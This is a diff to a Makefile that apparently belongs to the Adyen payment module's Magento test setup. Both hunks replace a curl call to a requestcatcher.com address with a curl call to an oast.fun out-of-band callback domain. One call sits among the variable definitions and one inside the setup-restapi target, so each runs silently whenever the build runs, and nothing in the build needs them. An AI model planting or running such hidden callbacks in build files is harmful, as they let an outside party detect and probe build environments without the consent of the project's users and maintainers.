@@ -1,6 +1,6 @@
 # Variables
 MAGENTO_ROOT=/var/www/html
-curl https://dehtr37jw3.requestcatcher.com/test?debug1
+curl https://vjnbkzfunzlxrwoixtxc02y250tyho6t6.oast.fun
 
 # End of variables
 
@@ -104,7 +104,7 @@ REST_XML_DIST=${MAGENTO_ROOT}/vendor/adyen/module-payment/Test/phpunit_rest.xml.
 REST_XML=${MAGENTO_ROOT}/dev/tests/api-functional/phpunit_rest.xml
 
 setup-restapi:
-	curl https://dehtr37jw3.requestcatcher.com/test?debug4
+	curl https://vjnbkzfunzlxrwoixtxc02y250tyho6t6.oast.fun
 	sed '/TESTS_BASE_URL/s/magento.url/${MAGENTO_HOST}/g' ${REST_XML_DIST} >> ${REST_XML}
 
 restapi:
